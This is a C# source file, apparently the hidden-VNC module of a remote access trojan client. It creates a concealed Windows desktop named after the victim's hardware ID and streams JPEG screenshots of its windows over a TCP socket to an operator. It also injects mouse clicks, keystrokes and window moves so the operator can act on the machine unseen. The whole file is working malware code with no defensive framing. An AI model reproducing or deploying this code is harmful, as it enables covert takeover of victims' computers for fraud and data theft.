using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;
using MessagePack;
using Microsoft.VisualBasic.CompilerServices;

namespace Client.HandlePacket
{
    internal static class HandleHVNC
    {
        public static bool IsOk { get; set; }
        public static bool inited = false;
        public static int screenx;
        public static int screeny;
        public static bool HigherThan81;
        public static IntPtr hNewDesktop;
        public static IntPtr hOldDesktop;

        public static void HandleHVNCInit()
        {
            var m_desktopName = Program.HWID;
            hOldDesktop = Native.GetThreadDesktop(Native.GetCurrentThreadId());
            hNewDesktop = Native.CreateDesktop(m_desktopName,
                IntPtr.Zero, IntPtr.Zero, 0, Native.AccessRights, IntPtr.Zero);
            Native.SetThreadDesktop(hNewDesktop);
            HigherThan81 = Isgreaterorequalto81();
            screenx = Screen.PrimaryScreen.Bounds.Width;
            screeny = Screen.PrimaryScreen.Bounds.Height;
            TitleBarHeight = Native.GetSystemMetrics(4);
            if (TitleBarHeight < 5) TitleBarHeight = 20;
            inited = true;
        }

        public static void CaptureAndSend()
        {
            Native.SetThreadDesktop(hNewDesktop);
            Native.SetProcessDPIAware();
            Bitmap bmp = null;
            BitmapData bmpData = null;
            Rectangle rect;
            Size size;
            Thread.Sleep(10);
            while (IsOk && Program.TCP_Socket.IsConnected)
                try
                {
                    bmp = RenderScreenshot();
                    rect = new Rectangle(0, 0, bmp.Width, bmp.Height);
                    size = new Size(bmp.Width, bmp.Height);
                    bmpData = bmp.LockBits(new Rectangle(0, 0, bmp.Width, bmp.Height), ImageLockMode.ReadWrite,
                        bmp.PixelFormat);

                    using (var stream = new MemoryStream())
                    {
                        bmp.Save(stream, bmp.RawFormat);
                        var byteImage = new byte[stream.Length];
                        byteImage = stream.ToArray();
                        var msgpack = new MsgPack();
                        msgpack.ForcePathObject("Packet").AsString = "hvnc";
                        msgpack.ForcePathObject("Stream").SetAsBytes(byteImage);
                        Program.TCP_Socket.Send(msgpack.Encode2Bytes());
                    }
                }
                catch
                {
                    break;
                }

            try
            {
                Native.SetThreadDesktop(hOldDesktop);
                IsOk = false;
                bmp?.UnlockBits(bmpData);
                bmp?.Dispose();
                GC.Collect();
            }
            catch (Exception ex)
            {
                Native.SetThreadDesktop(hOldDesktop);
                Program.TCP_Socket.Log(ex.Message);
            }
        }

        public static void StopHVNC()
        {
            Native.SetThreadDesktop(hOldDesktop);
            IsOk = false;
        }

        public static IntPtr lastactive;

        public static IntPtr lastactivebar;

        public static int quality = 100;

        public static double resize = 1;

        public static int TitleBarHeight;


        public static int startxpos;

        public static int startypos;

        public static int startwidth;

        public static int startheight;

        public static IntPtr handletomove;

        public static IntPtr handletoresize;

        public static IntPtr contextmenu;

        public static bool rightclicked;

        public static ImageCodecInfo[] codecs = ImageCodecInfo.GetImageEncoders();

        public static void PostClickLD(int x, int y)
        {
            Native.SetThreadDesktop(hNewDesktop);

            var intPtr = lastactive = Native.WindowFromPoint(new Point(x, y));
            var lpRect = default(Native.RECT);
            Native.GetWindowRect(intPtr, ref lpRect);
            checked
            {
                var point = new Point(x - lpRect.Left, y - lpRect.Top);
                var lpClassName = "#32768";
                var intPtr2 = Native.FindWindow(lpClassName, null);
                if (intPtr2 != IntPtr.Zero)
                {
                    contextmenu = intPtr2;
                    var lParam = (IntPtr) MakeLParam(x, y);
                    var temp = Native.PostMessage(contextmenu, 513u, new IntPtr(1), lParam);
                    rightclicked = true;
                }
                else if (Native.GetParent(intPtr) == (IntPtr) 0 && y - lpRect.Top < TitleBarHeight)
                {
                    lastactivebar = intPtr;
                    var temp = Native.PostMessage(intPtr, 513u, (IntPtr) 1,
                        (IntPtr) MakeLParam(x - lpRect.Left, y - lpRect.Top));
                    startxpos = x;
                    startypos = y;
                    handletomove = intPtr;
                    Native.SetWindowPos(intPtr, new IntPtr(-2), 0, 0, 0, 0, 3u);
                    Native.SetWindowPos(intPtr, new IntPtr(-1), 0, 0, 0, 0, 3u);
                    Native.SetWindowPos(intPtr, new IntPtr(-2), 0, 0, 0, 0, 67u);
                }
                else if (Native.GetParent(intPtr) == (IntPtr) 0 && point.X > lpRect.Right - lpRect.Left - 10 &&
                         point.Y > lpRect.Bottom - lpRect.Top - 10)
                {
                    startwidth = x;
                    startheight = y;
                    handletoresize = intPtr;
                }
                else
                {
                    var temp = Native.PostMessage(intPtr, 513u, (IntPtr) 1,
                        (IntPtr) MakeLParam(x - lpRect.Left, y - lpRect.Top));
                }
            }

            Native.SetThreadDesktop(hOldDesktop);
        }

        public static void PostClickLU(int x, int y)
        {
            Native.SetThreadDesktop(hNewDesktop);

            var hWnd = Native.WindowFromPoint(new Point(x, y));
            var lpRect = default(Native.RECT);
            Native.GetWindowRect(hWnd, ref lpRect);
            checked
            {
                if (rightclicked)
                {
                    Native.PostMessage(contextmenu, 514u, new IntPtr(1), (IntPtr) MakeLParam(x, y));
                    rightclicked = false;
                    contextmenu = IntPtr.Zero;
                }
                else if ((startxpos > 0) | (startypos > 0))
                {
                    Native.PostMessage(handletomove, 514u, (IntPtr) 0L,
                        (IntPtr) MakeLParam(x - lpRect.Left, y - lpRect.Top));
                    var lpRect2 = default(Native.RECT);
                    Native.GetWindowRect(handletomove, ref lpRect2);
                    var num = x - startxpos;
                    var num2 = y - startypos;
                    var num3 = lpRect2.Left + num;
                    var num4 = lpRect2.Top + num2;
                    Native.SetWindowPos(handletomove, new IntPtr(0), lpRect2.Left + num, lpRect2.Top + num2,
                        lpRect2.Right - lpRect2.Left, lpRect2.Bottom - lpRect2.Top, 64u);
                    startxpos = 0;
                    startypos = 0;
                    handletomove = IntPtr.Zero;
                }
                else if ((startwidth > 0) | (startheight > 0))
                {
                    var lpRect3 = default(Native.RECT);
                    Native.GetWindowRect(handletoresize, ref lpRect3);
                    var num5 = x - startwidth;
                    var num6 = y - startheight;
                    var cx = lpRect3.Right - lpRect3.Left + num5;
                    var cy = lpRect3.Bottom - lpRect3.Top + num6;
                    Native.SetWindowPos(handletoresize, new IntPtr(0), lpRect3.Left, lpRect3.Top, cx, cy, 64u);
                    startwidth = 0;
                    startheight = 0;
                    handletoresize = IntPtr.Zero;
                }
                else
                {
                    Native.PostMessage(hWnd, 514u, (IntPtr) 0L, (IntPtr) MakeLParam(x - lpRect.Left, y - lpRect.Top));
                }
            }

            Native.SetThreadDesktop(hOldDesktop);
        }

        public static void PostClickRD(int x, int y)
        {
            Native.SetThreadDesktop(hNewDesktop);

            var hWnd = Native.WindowFromPoint(new Point(x, y));
            var lpRect = default(Native.RECT);
            Native.GetWindowRect(hWnd, ref lpRect);
            checked
            {
                var point = new Point(x - lpRect.Left, y - lpRect.Top);
                Native.PostMessage(lastactive = Native.WindowFromPoint(new Point(x, y)), 516u, (IntPtr) 0L,
                    (IntPtr) MakeLParam(x - lpRect.Left, y - lpRect.Top));
            }

            Native.SetThreadDesktop(hOldDesktop);
        }

        public static void PostClickRU(int x, int y)
        {
            Native.SetThreadDesktop(hNewDesktop);

            var hWnd = Native.WindowFromPoint(new Point(x, y));
            var lpRect = default(Native.RECT);
            Native.GetWindowRect(hWnd, ref lpRect);
            checked
            {
                var point = new Point(x - lpRect.Left, y - lpRect.Top);
                var hWnd2 = Native.WindowFromPoint(new Point(x, y));
                Native.PostMessage(hWnd2, 517u, (IntPtr) 0L, (IntPtr) MakeLParam(x - lpRect.Left, y - lpRect.Top));
            }

            Native.SetThreadDesktop(hOldDesktop);
        }

        public static void PostMove(int x, int y)
        {
            Native.SetThreadDesktop(hNewDesktop);

            var hWnd = Native.WindowFromPoint(new Point(x, y));
            var lpRect = default(Native.RECT);
            Native.GetWindowRect(hWnd, ref lpRect);
            Native.PostMessage(hWnd, 512u, (IntPtr) 0L, (IntPtr) checked(MakeLParam(x - lpRect.Left, y - lpRect.Top)));
            Native.SetThreadDesktop(hOldDesktop);
        }

        public static void PostKeyDown(long k)
        {
            Debug.WriteLine(k);
            Native.SetThreadDesktop(hNewDesktop);

            if (k == 8 || k == 13)
            {
                Native.PostMessage(lastactive, 256u, (IntPtr) k, CreateLParamFor_WM_KEYDOWN(1, 30, false, false));
                Native.PostMessage(lastactive, 257u, (IntPtr) k, CreateLParamFor_WM_KEYUP(1, 30, false));
            }
            else
            {
                Native.PostMessage(lastactive, 258u, (IntPtr) k, (IntPtr) 1);
            }

            Native.SetThreadDesktop(hOldDesktop);
        }

        public static IntPtr KeysLParam(ushort RepeatCount, byte ScanCode, bool IsExtendedKey, bool DownBefore, bool State)
        {
            var num = RepeatCount | (ScanCode << 16);
            if (IsExtendedKey) num |= 0x10000;
            if (DownBefore) num |= 0x40000000;
            if (State) num |= int.MinValue;
            return new IntPtr(num);
        }

        public static IntPtr CreateLParamFor_WM_KEYDOWN(ushort RepeatCount, byte ScanCode, bool IsExtendedKey, bool DownBefore)
        {
            return KeysLParam(RepeatCount, ScanCode, IsExtendedKey, DownBefore, false);
        }

        public static IntPtr CreateLParamFor_WM_KEYUP(ushort RepeatCount, byte ScanCode, bool IsExtendedKey)
        {
            return KeysLParam(RepeatCount, ScanCode, IsExtendedKey, true, true);
        }

        public static int MakeLParam(int LoWord, int HiWord)
        {
            return (HiWord << 16) | (LoWord & 0xFFFF);
        }

        [DllImport("user32.dll", SetLastError = true)]
        private static extern int SetWindowLong(IntPtr hWnd, int nIndex, int dwNewLong);

        [DllImport("user32.dll", SetLastError = true)]
        private static extern int GetWindowLong(IntPtr hWnd, int nIndex);

        public static Bitmap RenderScreenshot()
        {
            checked
            {
                var result = default(Bitmap);
                try
                {
                    var t = new List<IntPtr>();
                    Native.EnumDelegate lpEnumCallbackFunction = delegate(IntPtr hWnd, int lParam)
                    {
                        try
                        {
                            if (Native.IsWindowVisible(hWnd))
                            {
                                t.Add(hWnd);
                                var style = GetWindowLong(hWnd, -20);
                                SetWindowLong(hWnd, -20, style | 0x02000000);
                            }

                            return true;
                        }
                        catch
                        {
                            return false;
                        }
                    };
                    if (Native.EnumDesktopWindows(IntPtr.Zero, lpEnumCallbackFunction, IntPtr.Zero))
                    {
                        var bitmap = new Bitmap(screenx, screeny);
                        var num = t.Count - 1;
                        for (var i = num; i >= 0; i += -1)
                            try
                            {
                                var lpRect = default(Native.RECT);
                                Native.GetWindowRect(t[i], ref lpRect);
                                var image = new Bitmap(lpRect.Right - lpRect.Left + 1, lpRect.Bottom - lpRect.Top + 1);
                                var graphics = Graphics.FromImage(image);
                                var hdc = graphics.GetHdc();
                                try
                                {
                                    if (HigherThan81)
                                        Native.PrintWindow(t[i], hdc, 2u);
                                    else
                                        Native.PrintWindow(t[i], hdc, 0u);
                                }
                                catch (Exception ex)
                                {
                                    Program.TCP_Socket.Log(ex.Message);
                                }

                                graphics.ReleaseHdc(hdc);
                                graphics.FillRectangle(Brushes.Gray, lpRect.Right - lpRect.Left - 10,
                                    lpRect.Bottom - lpRect.Top - 10, 10, 10);
                                var graphics2 = Graphics.FromImage(bitmap);
                                graphics2.DrawImage(image, lpRect.Left, lpRect.Top);
                            }
                            catch (Exception projectError2)
                            {
                                ProjectData.SetProjectError(projectError2);
                            }

                        var bitmap2 = new Bitmap(bitmap, (int) Math.Round(screenx * resize),
                            (int) Math.Round(screeny * resize));
                        var encoder = get_Codec("image/jpeg");
                        var encoderParameters = new EncoderParameters(1);
                        encoderParameters.Param[0] = new EncoderParameter(Encoder.Quality, quality);
                        var stream = new MemoryStream();
                        bitmap2.Save(stream, encoder, encoderParameters);
                        var bitmap3 = (Bitmap) Image.FromStream(stream);
                        bitmap2.Dispose();
                        GC.Collect();
                        result = bitmap3;
                        return result;
                    }

                    return result;
                }
                catch (Exception ex)
                {
                    ProjectData.SetProjectError(ex);
                    try
                    {
                        result = ReturnBMP();

                        return result;
                    }
                    catch (Exception projectError3)
                    {
                        ProjectData.SetProjectError(projectError3);
                    }

                    return result;
                }
            }
        }

        public static ImageCodecInfo get_Codec(string type)
        {
            if (type == null) return null;
            var array = codecs;
            foreach (var imageCodecInfo in array)
                if (Operators.CompareString(imageCodecInfo.MimeType, type, false) == 0)
                    return imageCodecInfo;
            return null;
        }

        public static Bitmap ReturnBMP()
        {
            var bitmap = new Bitmap(screenx, screeny);
            using (var graphics = Graphics.FromImage(bitmap))
            {
                var brush = (SolidBrush) Brushes.Red;
                graphics.FillRectangle(brush, 0, 0, screenx, screeny);
            }

            return bitmap;
        }

        public static bool Isgreaterorequalto81()
        {
            var oSVersion = Environment.OSVersion;
            var version = oSVersion.Version;
            if (oSVersion.Platform == PlatformID.Win32NT)
            {
                var major = version.Major;
                if (major == 6 && version.Minor != 0 && version.Minor != 1) return true;
            }

            return false;
        }

        public static void CloseTop()
        {
            var intPtr = lastactivebar;
            Native.SendMessage((int) intPtr, 16, 0, 0);
        }

        public static void RestoreMaxTop()
        {
            var intPtr = lastactivebar;
            if (Native.IsZoomed(intPtr))
                Native.ShowWindow(intPtr, 9);
            else
                Native.ShowWindow(intPtr, 3);
        }

        public static void MinTop()
        {
            var hWnd = lastactivebar;
            Native.ShowWindow(hWnd, 6);
        }
    }
}